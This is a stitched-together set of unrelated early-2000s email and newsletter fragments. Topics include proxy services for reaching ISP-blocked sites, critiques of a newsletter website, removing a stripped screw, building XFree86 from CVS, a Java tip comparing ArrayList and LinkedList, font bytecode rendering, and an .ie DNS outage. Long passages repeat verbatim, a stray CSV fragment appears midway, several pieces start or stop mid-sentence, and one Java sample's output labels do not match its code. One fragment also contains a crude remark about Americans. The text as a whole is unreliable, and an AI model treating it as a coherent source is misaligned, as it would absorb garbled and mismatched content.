 without coming right out and saying so? For example, I have a page with 
 actor and actress information and just want to have a picture of my 
 favorite stars to click on and change the picture every couple of days. <p>

 >Subject: Unblocking sites so I can access? (Issue #422) <p>
 
 --> I am currently living in a place where the ISP is 
 blocking 50% of 
 the web. I was told by someone that you can unblock these web sites by 
 using a proxy, but I don't know what that means. I am wondering is 
 there a way to get access to these sites? -- <br>
 <p>
 A proxy is easy to use if you use someone elses, they can be tricky to setup yourself. 
 I have had very good results with Surfola. Basically you surf to their servers and then 
 from there you surf Through/From their servers. I have several places I surf from that 
 block content. Surfola easily bypasses them! Its also Free! You can also make money 
 with them but I just use them to bypass anal retentive ISP/Corporate providers and 
 because they allow me to surf anonymously! <p>
 
 I have a detailed right-up on them at <a href=""http://linkpaks.com/paidtosurf/Surfola.php""> http://linkpaks.com/paidtosurf/Surfola.php </a>
 See there for more info. If anything is not clear feel free to ask.

 Subject: Using A Proxy To Visit Blocked Sites <p>
 
 >From: CJ  (cj5000@post.com) <br>
 >Subject: Unblocking sites so I can access? (Issue #422) <p>
 
 CJ, <p>
 
 Two such sites that allows proxy surfing are: <br>
 http://www.anonymise.com and
 http://www.anonymizer.com . <p>
 
 However, if you cannot get to that site then obviously it will not work. 
 Also note, that if your ISP is dictating to you which sites you may or 
 may not visit, then it is time to change providers! <p>

 I reviewed site 123 and found the size of the font to be too aggressive and 
 I don't like mustard yellow for a background. Also in the second or third 
 paragraph is a misspelled word which should be ""first-come"" not as 
 shown on the page.<p>
 
 I feel a sample of the type of information offered in the newsletter should 
 be displayed on the page as well as a sample of the free ads offered 
 on the site. I will probably submit a free ad just to see the content of the newsletter.  <p>
 
 As has been mentioned many times, some information about the person 
 doing the page is always good.  We need some information about 
 why this newsletter will be worthwhile to subscribe to. <br>
 ~~~~<p>
 
 Dennis - I took a look at your site, and have recommendations 
 for improving your page.<br>
 1- I use Internet Explorer and view web pages with my text size set to 
 'smaller'. The text you used was quite large, like a font used for a heading 
 for all the text. By making the text size smaller it wouldn't feel like 
 you were screaming at me. Also, the background was just too much.<br>
 2- There were spelling errors in the text. Often it might be difficult for you 
 to spot these yourself if you see the page all the time, but have a friend 
 look it over. Spelling errors make the page look unprofessional.<br>
 3- Offer a sample of your newsletter so people can see what it looks like 
 before they subscribe. Also, if you are asking for a person to give you 
 their email address, you MUST have a privacy policy and let them know 
 they can unsubscribe.<br>
 4- Think about adding a form for people to subscribe to the newsletter. 
 It looks more professional than just offering an email address to send to.<br>
 5- Offer information about yourself, and the kinds of information your 
 newsletter contains. Maybe extend your site to include back issues or 
 an archive to see what information you have offered in the past.<br>
 6- Build another page for 'sponsoring info' and put prices on that 
 page. Remove all pricing information from the home page.<br>
 ~~~~<p>
 
 I feel that the background is a little too bold and busy for the text. 
 I also believe that the text is too large which makes it difficult to read 
 quickly, and forces the reader to scroll down unnecessarily. 
 I noticed some spelling errors, and I think that a link to the classifieds 
 site should be provided, and online payments should be accepted. 
 A site that sells advertising should have advertisments on it!<br>
 ~~~~<p>
 
 This is a very clear site with nothing interfering with the 
 message.  I did not like the background colour, however that is 
 personal, it did not detract from the information.  I was tempted 
 to sign up for the newsletter but would have liked a link to see 
 a current issue. There was an error in the wording (a word 
 missed) which needs correction and I think the fonts could be 
 smaller. Overall a non-confusing site which makes a nice change. *cheers*<br>
 
 ~~~~<p>
 
 Could use a better background and the fonts are very large, there also 
 are errors in the following paragraphs : 
 ""first com-first serve"" and ""to place a sponsor advertisement, 
 send your to my email""<br>
 ~~~~<p>
 
 A single page site. It is necessary to subscribe to the webmaster's 
 newsletter to see what he's doing, and it doesn't seem to me to be 
 a way to get people to visit. I wouldn't, for example. He claims to 
 have lots of tidbits of information that, he says, we probably 
 didn't know, and this is possible, but in my opinion, he would be 
 better served if he at least put some of the things out there for 
 all to see - when the appetite, so to speak, if he want people to 
 subscribe. As it is, I would not bother.<br>
 ~~~~<p>
 
 What does one expect from a site like netsbestinfo? Some useful 
 resources and some useful tips and also some forms of easy 
 advertisement on the net. But what we get here is a newsletter 
 with the owner (whose email reads damorgarjr@yahoo.com) 
 asking us to subscribe us to his newsletter for a free 4-line ad. 
 He also tells of paid category of advertisements. This is all we get 
 from a site which has a grand title. Even the information about 
 the newsletter is hardly impressive and is presented in about 35-to-40 
 points size which gets difficult to read. <br>
 ~~~~<p>
 
 A neat enough site but the background could be a little hard on 
 the eyes. There is only really one problem with this page - its 
 just an advertisement for a newsletter. No, scratch that, its an 
 advertisement to place free ads in a newsletter. A bold enough 
 move perhaps but I learned hardly anything about the newsletter 
 itself and immediately started worrying about getting a flood of 
 ads to my email account so I didn't even subscribe. Presumably 
 you'd want to get people to sign up so might I suggest splitting 
 the page into the newsletter itself, perhaps a sample issue, 
 a privacy policy and a promise not to drown in ads and then click 
 for more info on your free ads. <p>

 I'm changing my website and want to use pictures for the links to other pages. 
 But, someone told me I should still put a 'click here' underneath all the 
 pictures. To me, this removes all purpose of using the pictures.  <p>
 
 How can I get across that you click on the pictures to get to other pages

 actor and actress information and just want to have a picture of my 
 favorite stars to click on and change the picture every couple of days. <p>

 CJ, <p>
 
 Two such sites that allows proxy surfing are: <br>
 http://www.anonymise.com and
 http://www.anonymizer.com . <p>
 
 However, if you cannot get to that site then obviously it will not work. 
 Also note, that if your ISP is dictating to you which sites you may or 
 may not visit, then it is time to change providers! <p>

 I reviewed site 123 and found the size of the font to be too aggressive and 
 I don't like mustard yellow for a background. Also in the second or third 
 paragraph is a misspelled word which should be ""first-come"" not as 
 shown on the page.<p>
 
 I feel a sample of the type of information offered in the newsletter should 
 be displayed on the page as well as a sample of the free ads offered 
 on the site. I will probably submit a free ad just to see the content of the newsletter.  <p>
 
 As has been mentioned many times, some information about the person 
 doing the page is always good.  We need some information about 
 why this newsletter will be worthwhile to subscribe to. <br>
 ~~~~<p>
 
 Dennis - I took a look at your site, and have recommendations 
 for improving your page.<br>
 1- I use Internet Explorer and view web pages with my text size set to 
 'smaller'. The text you used was quite large, like a font used for a heading 
 for all the text. By making the text size smaller it wouldn't feel like 
 you were screaming at me. Also, the background was just too much.<br>
 2- There were spelling errors in the text. Often it might be difficult for you 
 to spot these yourself if you see the page all the time, but have a friend 
 look it over. Spelling errors make the page look unprofessional.<br>
 3- Offer a sample of your newsletter so people can see what it looks like 
 before they subscribe. Also, if you are asking for a person to give you 
 their email address, you MUST have a privacy policy and let them know 
 they can unsubscribe.<br>
 4- Think about adding a form for people to subscribe to the newsletter. 
 It looks more professional than just offering an email address to send to.<br>
 5- Offer information about yourself, and the kinds of information your 
 newsletter contains. Maybe extend your site to include back issues or 
 an archive to see what information you have offered in the past.<br>
 6- Build another page for 'sponsoring info' and put prices on that 
 page. Remove all pricing information from the home page.<br>
 ~~~~<p>
 
 I feel that the background is a little too bold and busy for the text. 
 I also believe that the text is too large which makes it difficult to read 
 quickly, and forces the reader to scroll down unnecessarily. 
 I noticed some spelling errors, and I think that a link to the classifieds 
 site should be provided, and online payments should be accepted. 
 A site that sells advertising should have advertisments on it!<br>
 ~~~~<p>
 
 This is a very clear site with nothing interfering with the 
 message.  I did not like the background colour, however that is 
 personal, it did not detract from the information.  I was tempted 
 to sign up for the newsletter but would have liked a link to see 
 a current issue. There was an error in the wording (a word 
 missed) which needs correction and I think the fonts could be 
 smaller. Overall a non-confusing site which makes a nice change. *cheers*<br>
 
 ~~~~<p>
 
 Could use a better background and the fonts are very large, there also 
 are errors in the following paragraphs : 
 ""first com-first serve"" and ""to place a sponsor advertisement, 
 send your to my email""<br>
 ~~~~<p>
 
 A single page site. It is necessary to subscribe to the webmaster's 
 newsletter to see what he's doing, and it doesn't seem to me to be 
 a way to get people to visit. I wouldn't, for example. He claims to 
 have lots of tidbits of information that, he says, we probably 
 didn't know, and this is possible, but in my opinion, he would be 
 better served if he at least put some of the things out there for 
 all to see - when the appetite, so to speak, if he want people to 
 subscribe. As it is, I would not bother.<br>
 ~~~~<p>
 
 What does one expect from a site like netsbestinfo? Some useful 
 resources and some useful tips and also some forms of easy 
 advertisement on the net. But what we get here is a newsletter 
 with the owner (whose email reads damorgarjr@yahoo.com) 
 asking us to subscribe us to his newsletter for a free 4-line ad. 
 He also tells of paid category of advertisements. This is all we get 
 from a site which has a grand title. Even the information about 
 the newsletter is hardly impressive and is presented in about 35-to-40 
 points size which gets difficult to read. <br>
 ~~~~<p>
 
 A neat enough site but the background could be a little hard on 
 the eyes. There is only really one problem with this page - its 
 just an advertisement for a newsletter. No, scratch that, its an 
 advertisement to place free ads in a newsletter. A bold enough 
 move perhaps but I learned hardly anything about the newsletter 
 itself and immediately started worrying about getting a flood of 
 ads to my email account so I didn't even subscribe. Presumably 
 you'd want to get people to sign up so might I suggest splitting 
 the page into the newsletter itself, perhaps a sample issue, 
 a privacy policy and a promise not to drown in ads and then click 
 for more info on your free ads. <p>

 Get a very, *very* small set of drill bits.  Start drilling right
 through the center of the head, at a slow speed so you don't pop
 off and through the board!  Once you have a bit of an indent in,
 increase the speed a little bit.
 
 If you've made a deepish indent, and the head doesn't pop off, use
 the next largest drill bit you have.  Repeat until happy.
 
 Eventually the head should just pop off, allowing you to lift the
 board off over the shaft of the screw... then ye can take out the
 rest fairly easily with a pliers or whatnot.

182,"Subject: Re: [ILUG] CVS question?
","Well, as many have said, it's non-trivial and not smart enough.
 
 I did try just cvs'ing over the existing sources, but cvs complained that my 
 files were in the way.
 
 Then I thought that I'd only need the DRI stuff, that took about 1.5 hours to 
 fetch 116M. Unfortunately I still need the XFree86 cvs stuff as well :-( At 
 339M that took almost 3 hours.
 
 Now I can start building the XFree86 cvs and DRI cvs stuff for testing the 3D 
 patches for my GVX1 card. I just hope I don't completely trash my system in 
 the process. 
 
 Think I'll wait until morning to start building, though. I've been building a 
 new box from source this week. A 200Mhz PentiumMMX with 96M. It took a full 
 day to build XFree86 4.2.0 and 2.5 days each to build qtlibs and kdelibs. 
 kdebase took just under 46 hours. I've got lots of grief from the wife for 
 the computer running 'round the clock this week. The rest of KDE should build 
 in under 20 hour increments.
 
 Cheers,

 I'd say that the file apt downloaded is corrupted. Maybe trying ""apt-get
 clean"" to remove all downloaded files first would solve the problem.

 <h3>USING ARRAYLIST AND LINKEDLIST</h3>
 
 <p>
 <code>ArrayList</code> and <code>LinkedList</code> are two <code>Collections</code> classes used for storing lists of object references. For example, you could have an <code>ArrayList</code> of Strings, or a <code>LinkedList</code> of Integers. This tip compares the performance of <code>ArrayList</code> and <code>LinkedList</code>, and offers some suggestions about which of these classes is the right choice in a given situation.
 </p>
 
 <p>
 The first key point is that an <code>ArrayList</code> is backed by a primitive <code>Object</code> array. Because of that, an <code>ArrayList</code> is much faster than a <code>LinkedList</code> for random access, that is, when accessing arbitrary list elements using the <code>get</code> method. Note that the <code>get</code> method is implemented for <code>LinkedLists</code>, but it requires a sequential scan from the front or back of the list. This scan is very slow. For a <code>LinkedList</code>, there's no fast way to access the Nth element of the list.
 </p>
 
 
 <p>
 Consider the following example. Suppose you have a large list of sorted elements, either an <code>ArrayList</code> or a <code>LinkedList</code>. Suppose too that you do a binary search on the list. The standard binary search algorithm starts by checking the search key against the value in the middle of the list. If the middle value is too high, then the upper half of the list is eliminated. However, if the middle value is too low, then the lower half of the list is ignored. This process continues until the key is found in the list, or until the lower bound of the search becomes greater than the upper bound.
 </p>
 
 <p>
 Here's a program that does a binary search on all the elements in an <code>ArrayList</code> or a <code>LinkedList</code>:
 </p>
 
 <pre>
     import java.util.*;
 
     public class ListDemo1 {
         static final int N = 10000;
 
         static List values;
 
         // make List of increasing Integer values
 
         static {
            Integer vals[] = new Integer[N];
 
            Random rn = new Random();
 
            for (int i = 0, currval = 0; i &lt; N; i++) {
                vals[i] = new Integer(currval);
                currval += rn.nextInt(100) + 1;
            }
 
            values = Arrays.asList(vals);
         }
         
         // iterate across a list and look up every
         // value in the list using binary search
 
         static long timeList(List lst) {
             long start = System.currentTimeMillis();
 
             for (int i = 0; i &lt; N; i++) {
 
                // look up a value in the list 
                // using binary search
 
                int indx = Collections.binarySearch(
                                    lst, values.get(i));
 
                // sanity check for result 
                // of binary search
 
                if (indx != i) {
                    System.out.println(
                                     &quot;*** error ***\n&quot;);
                }
            }
 
            return System.currentTimeMillis() - start;
        }
 
        public static void main(String args[]) {
 
            // do lookups in an ArrayList 
 
            System.out.println(&quot;time for ArrayList = &quot; +
                timeList(new ArrayList(values)));
 
            // do lookups in a LinkedList
 
            System.out.println(
                &quot;time for LinkedList = &quot; +
                timeList(new LinkedList(values)));
        }
     }
 </pre>
 
 <p>
 The <code>ListDemo1</code> program sets up a <code>List</code> of sorted Integer values. It then adds the values to an <code>ArrayList</code> or a <code>LinkedList</code>. Then <code>Collections.binarySearch</code> is used to search for each value in the 
 list.
 </p>
 
 <p>
 When you run this program, you should see a result that looks something like this:
 </p>
 
 <pre>
     time for ArrayList = 31
 
     time for LinkedList = 4640
 </pre>
 
 <p>
 <code>ArrayList</code> is about 150 times faster than <code>LinkedList</code>. (Your results might differ depending on your machine characteristics, but you should see a distinct difference in the result for <code>ArrayList</code> as compared to that for <code>LinkedList</code>. The same is true for the other programs in this tip.) Clearly, <code>LinkedList</code> is a bad choice in this situation. The binary search algorithm inherently uses random access, and <code>LinkedList</code> does not support fast random access. The time to do a random access in a <code>LinkedList</code> is proportional to the size of the list. By comparison, random access in an <code>ArrayList</code> has a fixed time.
 </p>
 
 <p>
 You can use the <code>RandomAccess</code> marker interface to check whether a List supports fast random access:
 </p>
 
 <pre>
     void f(List lst) {
         if (lst instanceof RandomAccess) {
             // supports fast random access
         }
     }
 </pre>
 
 <p>
 <code>ArrayList</code> implements the <code>RandomAccess</code> interface, and <code>LinkedList</code>. does not. Note that <code>Collections.binarySearch</code> does take advantage of the <code>RandomAccess</code> property, to optimize searches.
 </p>
 
 <p>
 Do these results prove that <code>ArrayList</code> is always a better choice? Not necessarily. There are many cases where <code>LinkedList</code> does better. Also note that there are many situations where an algorithm can be implemented efficiently for <code>LinkedList</code>. An example is reversing a <code>LinkedList</code> using <code>Collections.reverse</code>. The internal algorithm does this, and gets reasonable performance, by using forward and backward iterators.
 </p>
 
 <p>
 Let's look at another example. Suppose you have a list of elements, and you do a lot of element inserting and deleting to the list. In this case, <code>LinkedList</code> is the better choice. To demonstrate that, consider the following &quot;worst case&quot; scenario. In this demo, a program repeatedly inserts elements at the beginning of a list. The code looks like this:
 </p>
 
 <pre>
     import java.util.*;
 
     public class ListDemo2 {
         static final int N = 50000;
 
         // time how long it takes to add 
         // N objects to a list
 
         static long timeList(List lst) {
             long start = System.currentTimeMillis();
 
             Object obj = new Object();
 
             for (int i = 0; i &lt; N; i++) {
                 lst.add(0, obj);
             }
 
             return System.currentTimeMillis() - start;
         }
 
         public static void main(String args[]) {
 
             // do timing for ArrayList
 
             System.out.println(
                 &quot;time for ArrayList = &quot; +
                 timeList(new ArrayList()));
 
             // do timing for LinkedList
 
             System.out.println(
                 &quot;time for LinkedList = &quot; +
                 timeList(new LinkedList()));
         }
     } 
 </pre>
 
 <p>
 When you run this program, the result should look something like this:
 </p>
 
 <pre>
     time for ArrayList = 4859
 
     time for LinkedList = 125
 </pre>
 
 <p>
 These results are pretty much the reverse of the previous example.
 </p>
 
 <p>
 When an element is added to the beginning of an <code>ArrayList</code>, all of the existing elements must be pushed back, which means a lot of expensive data movement and copying. By contrast, adding an element to the beginning of a <code>LinkedList</code> simply means allocating an internal record for the element and then adjusting a couple of links. Adding to the beginning of a <code>LinkedList</code> has fixed cost, but adding to the beginning of an <code>ArrayList</code> has a cost that's proportional to the list size.
 </p>
 
 <p>
 So far, this tip has looked at speed issues, but what about space? Let's look at some internal details of how <code>ArrayList</code> and <code>LinkedList</code> are implemented in Java 2 SDK, Standard Edition v 1.4. These details are not part of the external specification of these classes, but are illustrative of how such classes work internally.
 </p>
 
 <p>
 The <code>LinkedList</code> class has a private internal class defined like this:
 </p>
 
 <pre>
     private static class Entry {
         Object element;
         Entry next;
         Entry previous;
     } 
 </pre>
 
 
 <p>
 Each <code>Entry</code> object references a list element, along with the next and previous elements in the <code>LinkedList</code> -- in other words, a doubly-linked list. A <code>LinkedList</code> of 1000 elements will have 1000 <code>Entry</code> objects linked together, referencing the actual list elements. There is significant space overhead in a <code>LinkedList</code> structure, given all these <code>Entry</code> objects.
 </p>
 
 <p>
 An <code>ArrayList</code> has a backing <code>Object</code> array to store the elements. This array starts with a capacity of 10. When the array needs to grow, the new capacity is computed as:
 </p>
 
 <pre>
     newCapacity = (oldCapacity * 3) / 2 + 1;
 </pre>
 
 <p>
 Notice that the array capacity grows each time by about 50%. This means that if you have an <code>ArrayList</code> with a large number of elements, there will be a significant amount of space wasted at the end. This waste is intrinsic to the way <code>ArrayList</code> works. If there was no spare capacity, the array would have to be reallocated for each new element, and performance would suffer dramatically. Changing the growth strategy to be more aggressive (such as doubling the size at each reallocation) would result in slightly better performance, but it would waste more space.
 </p>
 
 <p>
 If you know how many elements will be in an <code>ArrayList</code>, you can specify the capacity to the constructor. You can also call the <code>trimToSize</code> method after the fact to reallocate the internal array. This gets rid of the wasted space.
 </p>
 
 <p>
 So far, this discussion has assumed that either an <code>ArrayList</code> or a <code>LinkedList</code> is &quot;right&quot; for a given application. But sometimes, other choices make more sense. For example, consider the very common situation where you have a list of key/value pairs, and you would like to retrieve a value for a given key.
 </p>
 
 <p>
 You could store the pairs in an N x 2 <code>Object</code> array. To find the right pair, you could do a sequential search on the key values. This approach works, and is a useful choice for very small lists (say 10 elements or less), but it doesn't scale to big lists.
 </p>
 
 <p>
 Another approach is to sort the key/value pairs by ascending key value, store the result in a pair of <code>ArrayLists</code>, and then do a binary search on the keys list. This approach also works, and is very fast. Yet another approach is to not use a list structure at all, but instead use a map structure (hash table), in the form of a <code>HashMap</code>.
 </p>
 
 <p>
 Which is faster, a binary search on an <code>ArrayList</code>, or a <code>HashMap</code>? Here's a final example that compares these two:
 </p>
 
 <pre>
     import java.util.*;
 
     public class ListDemo3 {
         static final int N = 500000;
 
         // Lists of keys and values
 
         static List keys;
         static List values;
 
         // fill the keys list with ascending order key 
         // values and fill the values list with
         // corresponding values (-key)
 
         static {
             Integer keyvec[] = new Integer[N];
             Integer valuevec[] = new Integer[N];
 
             Random rn = new Random();
 
             for (int i = 0, currval = 0; i &lt; N; i++) {
                 keyvec[i] = new Integer(currval);
                 valuevec[i] = new Integer(-currval);
                 currval += rn.nextInt(100) + 1;
             }
 
             keys = Arrays.asList(keyvec);
             values = Arrays.asList(valuevec);
         }
 
         // fill a Map with key/value pairs
 
         static Map map = new HashMap();
 
         static {
             for (int i = 0; i &lt; N; i++) {
                 map.put(keys.get(i), values.get(i));
             }
         }
 
         // do binary search lookup of all keys
 
         static long timeList() {
             long start = System.currentTimeMillis();
 
             for (int i = 0; i &lt; N; i++) {
                 int indx = Collections.binarySearch(
                                     keys, keys.get(i));
 
                 // sanity check of returned value 
                 // from binary search
 
                 if (indx != i) {
                     System.out.println(
                                     &quot;*** error ***\n&quot;);
                 }
             }
 
             return System.currentTimeMillis() - start;
         }
 
         // do Map lookup of all keys
 
         static long timeMap() {
             long start = System.currentTimeMillis();
 
             for (int i = 0; i &lt; N; i++) {
                 Integer value = (Integer)map.get(
                                           keys.get(i));
 
                 // sanity check of value returned 
                 // from map lookup
 
                 if (value != values.get(i)) {
                     System.out.println(
                                     &quot;*** error ***\n&quot;);
                 }
             }
 
             return System.currentTimeMillis() - start;
         }
 
         public static void main(String args[]) {
 
             // do timing for List implementation
 
             System.out.println(""List time = "" + 
                                            timeList());
 
             // do timing for Map implementation
 
             System.out.println(&quot;Map time = &quot; + 
                                             timeMap());
         }
     }
 </pre>
 
 <p>
 The program sets up <code>Lists</code> of keys and values, and then uses two different techniques to map keys to values. One approach uses a binary search on a list, the other a hash table.
 </p>
 
 <p>
 When you run the <code>ListDemo3</code> program, you should get a result that looks something like this:
 </p>
 
 <pre>
     ArrayList time = 1000
 
     HashMap time = 281
 </pre>
 
 <p>
 In this example, N has a value of 500000. Approximately, log2(N) - 1 comparisons are required in an average successful binary search, so each binary search lookup in the <code>ArrayList</code> will take about 18 comparisons. By contrast, a properly implemented hash table typically requires only 1-3 comparisons. So you should expect the hash table to be faster in this case.
 </p>
 
 <p>
 However, binary search is still useful. For example, you might want to do a lookup in a sorted list and then find keys that are close in value to the key used for the lookup. Doing this is easy with binary search, but impossible in a hash table. Keys in a hash table are stored in apparent random order. Also, if you are concerned with worst-case performance, the binary search algorithm offers a much stronger performance guarantee than a hash table scheme. You might also consider using TreeMap for doing lookups in sorted collections of key/value pairs.
 </p>
 
 <p>
 Let's summarize the key points presented in this tip:
 </p>
 
 <ul>
   <li>Appending elements to the end of a list has a fixed averaged cost for both <code>ArrayList</code> and <code>LinkedList.</code> For <code>ArrayList</code>, appending typically involves setting an internal array location to the element reference, but occasionally results in the array being reallocated. For <code>LinkedList</code>, the cost is uniform and involves allocating an internal <code>Entry</code> object.</li>
 
   <li>Inserting or deleting elements in the middle of an <code>ArrayList</code> implies that the rest of the list must be moved. Inserting or deleting elements in the middle of a <code>LinkedList</code> has fixed cost.</li>
 
   <li>A <code>LinkedList</code> does not support efficient random access</li>
 
   <li>An <code>ArrayList</code> has space overhead in the form of reserve capacity at the end of the list. A <code>LinkedList</code> has significant space overhead per element.</li>
 
   <li>Sometimes a <code>Map</code> structure is a better choice than a <code>List</code>.</li>
 </ul>

 <h3>USING ZERO-LENGTH ARRAYS</h3>
 
 <p>
 Suppose that you are writing a Java application that involves some sort of data filtering. You have some raw data that you want to clean up and process in various ways. One of the methods you've written takes an array of integers, along with minimum and maximum values. The method goes through the array and eliminates &quot;outliers,&quot; that is, values that are too small or too big. The result of the filtering process is a new array of cleaned-up data.
 </p>
 
 <p>
 How could you implement this kind of filtering method? Here's one approach:
 </p>
 
 <pre>
     import java.util.*;
     
     public class ZeroDemo1 {
     
         // filter input array and throw away values 
         // that are less than minval or greater than 
         // maxval
     
         static int[] filterData(
                 int indata[], int minval, int maxval) {
     
             // check parameters for errors 
     
             if (indata == null) {
                 throw new NullPointerException(
                                      &quot;indata is null&quot;);
             }
             if (maxval &lt; minval) {
                 throw new IllegalArgumentException(
                 &quot;maxval &lt; minval&quot;);
             }
     
             // count number of valid values 
             // in input array
     
             int validcnt = 0;
             for (int i = 0; i &lt; indata.length; i++) {
                 if (indata[i] &gt;= minval &amp;&amp; indata[i] 
                                          &lt;= maxval) {
                     validcnt++;
                 }
             }
     
             // if no valid values, return null
     
             if (validcnt == 0) {
                 return null;
             }
     
             // copy valid values to new array 
             // and return it
     
             int outdata[] = new int[validcnt];
             for (int i = 0, j = 0; 
                               i &lt; indata.length; i++) {
                 if (indata[i] &gt;= minval &amp;&amp; indata[i] 
                                            &lt;= maxval) {
                     outdata[j++] = indata[i];
                 }
             }
             return outdata;
         }
     
         public static void main(String args[]) {
     
             // set up test array of integers
     
             int indata[] = new int[]{1, 3, -17, 8, 59};
     
             // filter out values not in the range 1-10
     
             int outdata1[] = filterData(indata, 1, 10);
             for (int i = 0; i &lt; outdata1.length; i++) {
                 System.out.println(outdata1[i]);
             }
     
             // filter out values not 
             // in the range 100-200
     
             int outdata2[] = filterData(
                                      indata, 100, 200);
             for (int i = 0; i &lt; outdata2.length; i++) {
                 System.out.println(outdata2[i]);
             }
         }
     }
 </pre>
 
 <p>
 The <code>filterData</code> method does two scans of the input array. The first scan counts the number of valid data values. Then the method allocates a new array of the appropriate size, and copies the good values to it. If there are no good values, the method returns a null value for the array reference.
 </p>
 
 <p>
 The result of running the <code>ZeroDemo1</code> program is:
 </p>
 
 <pre>
     1
     3
     8
     Exception in thread &quot;main&quot;
     java.lang.NullPointerException
         at ZeroDemo1.main(ZeroDemo1.java:72)
 </pre>
 
 <p>
 The problem with this program is a rather basic one. The second call of <code>filterData</code> returns a null value, and the program fails to take this possibility into account.
 </p>
 
 <p>
 A better approach in this example would be to comment out the block of code that tests for the possibility of no valid data values:
 </p>
 
 <pre>
     /*
     if (validcnt == 0) {
         return null;
     }
     */
 </pre>
 
 <p>
 When there is no valid data, the code will fall through to the next line, where a zero-length array is allocated:
 </p>
 
 <pre>
     int outdata[] = new int[0];
 </pre>
 
 <p>
 This is perfectly legal Java usage. The representation of Java arrays includes the length of the array, and it's therefore possible to tell if an array has zero length.
 </p>
 
 <p>
 For the <code>ZeroDemo1</code> example, if you anticipate that validcnt will often be zero, that is, data filtering will often eliminate all values from the input, then you could optimize away the second input scan by adding code like this:
 </p>
 
 <pre>
     int outdata[] = new int[validcnt];
     if (validcnt == 0) {
         return outdata;
     }
 </pre>
 
 <p>
 Note that usage such as:
 </p>
 
 <pre>
     int outdata[] = new int[]{};
 </pre>
 
 <p>
 is also legal, to initialize an array with a zero-length set of integer constants.
 </p>
 
 <p>
 In general, it's best not to return null from a method that returns an array type. Always returning an array, even if the array has zero length, greatly improves the generality of algorithms. If you anticipate that your methods will often return zero-length arrays, you might be concerned about the performance implications of allocating many such arrays. In this case, you can allocate a single array, and always return the same one, as follows:
 </p>
 
 <pre>
     private static final int ZERO_LENGTH_ARRAY[] = 
                                             new int[0];
 </pre>
 
 <p>
 This array is immutable (it can't be changed), and can be shared throughout your application.
 </p>
 
 <p>
 There's another way that zero-length arrays are used, as illustrated in the following example:
 </p>
 
 <pre>
     import java.util.*;
     
     public class ZeroDemo2 {
         public static void main(String args[]) {
     
             // set up ArrayList and add strings to it
     
             List stringlist = new ArrayList();
             stringlist.add(&quot;string 1&quot;);
             stringlist.add(&quot;string 2&quot;);
             stringlist.add(&quot;string 3&quot;);
     
             // convert to String array
     
             String out[] = (
                           String[])stringlist.toArray(
             new String[0]);
             for (int i = 0; i &lt; out.length; i++) {
                 System.out.println(out[i]);
             }
         }
     }
 </pre>
 
 <p>
 The result of running the <code>ZeroDemo2</code> program is:
 </p>
 
 <pre>
     string 1
     string 2
     string 3
 </pre>
 
 <p>
 The <code>ZeroDemo2</code> program sets up an <code>ArrayList</code>, and adds three strings to it. Then the program calls <code>toArray</code> to get a <code>String</code> array of the three elements in the <code>ArrayList</code>. In this example, the argument to <code>toArray</code> is &quot;new String[0]&quot;. This argument serves a couple of purposes. First, if you have a <code>String</code> array that's big enough to hold the elements of the <code>ArrayList</code>, you can specify it as the argument to <code>toArray</code>. The method will use the <code>String</code> array.
 </p>
 
 <p>
 But if your array is not big enough, then the <code>toArray</code> method allocates an array to return the elements. It uses the type of the array that was passed in to determine the type of the allocated array. <code>ArrayList</code> stores its element references in an <code>Object</code> array. The <code>toArray</code> method needs to be told if there is some other type (such as String) to be used for returning the array of elements. The method uses reflection (<code>java.lang.reflect.Array.newInstance</code>) to create an array of the appropriate type.
 </p>
 
 <p>

 In my experience, this is classic ""American"" behaviour, and I don't 
 think its on the increase outside of the US of A.
 I am willing to accept the premise that Americans are bigger dickheads 
 then they used to be.

","This is a multi-part message in MIME format.

 Content-type: text/plain; charset=us-ascii; format=flowed

 Following further study, I've concluded:
 
    1. It is easy to enable the bytecode interpreter.
 
    2. This noticeably improves rendering of non-antialiased text.
 
    3. This noticeably *harms* rendering of antialiased text.
 
 Point #3 probably surprises the rest of you as much as it surprised me. 
   Ever since turning on the bytecode interpreter, I've been bugged by a 
 sense that the antialiased text in my GNOME2 applications just looked, 
 well, wrong somehow.  I finally took some comparison screen shots with 
 and without the interpreter, and that made the difference crystal clear.
 
 Consider the two images attached below.  The first, ""no-bytecodes.png"", 
 shows some text rendered by a GNOME2 panel menu without the bytecode 
 interpreter.  Contrast this with the second, ""bytecodes.png"", taken with 
 the bytecode interpreter enabled.
 
 When the bytecode interpreter is turned on, notice that several 
 rendering anomalies appear:
 
    - Several letters are narrower, giving the whole run of text a more
      compressed feel.  This is especially noticeable in ""R"" and ""o"".
 
    - The left side of the ""Q"" is painted in too light a shade of grey,
      causing it to drop out somewhat.  ""C"", not in this sample, has the
      same problem.
 
    - ""Qu"" are set right up against each other, with insufficient
      whitespace between them.
 
    - ""M"" is distinctly asymmetric.
 
    - The enclosed loop of ""a"" looks muddy, as it is partially filled
      with grey.  Contrast with ""a"" drawn without the bytecode
      interpreter, which has a nice clear open loop.
 
 Ick.  Perhaps this is why Red Hat turned the bytecode interpreter off. 
 It may improve non-antialiased rendering, but only at the expense of 
 making a mess of antialiased rendering.
 
 This may come down to a matter of personal aesthetics, but for my part, 
 I'm going back to Red Hat's standard packages with the bytecode 
 interpreter turned *off*.

 Yeah but I was right and I was there. The people who were saying that it
 did not happen did not see the fadeout in progress. It only came back
 after the server was rebooted properly. However improbable it seemed at
 the time, the nameservers came back up after a power outage without the
 .ie zonefile. As a result it, there was nothing in the file that the
 secondaries picked up. At the time, I thought that the file was on an
 NFS. But if it regenerated after reboot, and the NFS input was not
 there, it would have generated a blank zonefile - that makes some sense.
 History now but it has an alarming relevance. :)

 Confirm that. The nameservers themselves had connectivity problems from
 what I could see and it was going on for a while, even *after* the
 initial SOA problems. 
 
 I am thinking of writing a simple .ie secondary state monitor for
 inclusion on WhoisIreland.com as these guys seem to be technologically
 incapable of running their own DNSes. What kind of distorted logic hands
 the admin of a national tld to a company that does not even handle DNS
 for its own domain? Whatever selection process IEDR used should be
 investigated by the relevant government department, especially as the
 company supposedly providing technical administration to IEDR did not
 actually spot this loss of synch. The IEDR contract with the company
 should be reviewed in the light of this event. This kind of 1 week loss
 of synch should not happen with a national domain. Ireland as E-hub -
 more like e-jit central! :)

 I have folks who leave their email programs running 24 hours a day, constantly polling 
 for mail. If they go away for a long weekend, lots of ""friday night spam"" will become 
 ham on sunday night.  (Friday night seems to be the most popular time)
 
 
 > - Your idea here.
 
 Ultimately I'd like to see tight integration into the ""most popular email clients"".. As a 
 stop-gap to the auto-ham ..
 
 How about adding an IMAP server with a spam and deleted-ham folder. Most email 
